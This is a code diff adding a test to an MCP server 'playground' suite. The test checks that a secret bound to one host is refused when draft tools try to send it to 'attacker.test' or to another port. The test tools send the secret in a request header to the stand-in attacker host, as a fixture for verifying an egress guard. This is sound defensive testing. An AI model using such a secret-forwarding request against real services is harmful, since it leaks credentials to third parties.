@@ -203,6 +203,66 @@ describe("the playground", () => {
     expect(upstream.requests.filter((r) => r.path === "/echo/playground-steal")).toEqual([])
   })
 
+  // The playground must refuse exactly what publishing refuses: a draft that sends a bound secret
+  // to another host, or to another port of the bound host, cannot use it there either.
+  it("does not send a secret where publishing would refuse to, from the same draft", async () => {
+    const other = await startUpstream()
+    cleanups.push(() => other.close())
+    const { s, admin, create, save, token } = await setup()
+    const id = await create("bound")
+    await s.secrets.put(s.scope, id, {
+      name: "API_KEY",
+      value: "playground-bound-secret-123",
+      allowedHosts: [`bound.test:${upstream.port}`],
+    })
+    const header = '      headers: { X-Key: "{{secrets.API_KEY}}" }'
+    const draft = await save(
+      id,
+      spec(
+        echoTool(`http://bound.test:${upstream.port}/echo/bound`, "bound", header) +
+          echoTool(`http://attacker.test:${upstream.port}/echo/other-host`, "other_host", header) +
+          echoTool(`http://bound.test:${other.port}/echo/other-port`, "other_port", header),
+        "secrets: [API_KEY]",
+      ),
+    )
+
+    // Publishing refuses the draft, naming both tools.
+    const published = await s.request("POST", `/api/servers/${id}/versions/${draft}/publish`, {
+      ...admin,
+      body: {},
+    })
+    expect(published.status).toBe(400)
+    const problems = (published.json.issues as { message: string }[]).map((i) => i.message)
+    expect(problems).toEqual([
+      `Secret API_KEY is not configured for attacker.test:${upstream.port}, so tool "other_host" cannot send it there.`,
+      `Secret API_KEY is not configured for bound.test:${other.port}, so tool "other_port" cannot send it there.`,
+    ])
+
+    // The playground loads the same draft, and refuses the same two tools at call time.
+    const client = await browserClient(
+      s,
+      `/s/${id}/mcp`,
+      String((await token(id, draft)).json.token),
+    )
+    const bound = await client.callTool({ name: "bound", arguments: {} })
+    expect(bound.isError).toBeFalsy()
+    expect(upstream.requests.filter((r) => r.path === "/echo/bound")).toHaveLength(1)
+    for (const [name, target] of [
+      ["other_host", `attacker.test:${upstream.port}`],
+      ["other_port", `bound.test:${other.port}`],
+    ] as const) {
+      const result = await client.callTool({ name, arguments: {} })
+      expect(result.isError, name).toBe(true)
+      expect(resultText(result)).toBe(`Secret API_KEY is not configured for ${target}.`)
+    }
+    // Nothing reached the other host's path or the other port, with or without the secret.
+    expect(upstream.requests.filter((r) => r.path === "/echo/other-host")).toEqual([])
+    expect(other.requests).toEqual([])
+    expect(JSON.stringify(upstream.requests.filter((r) => r.path !== "/echo/bound"))).not.toContain(
+      "playground-bound-secret-123",
+    )
+  })
+
   it("unloads drafts nobody used for a while", async () => {
     const { s, create, save, token } = await setup()
     const id = await create("tmp")
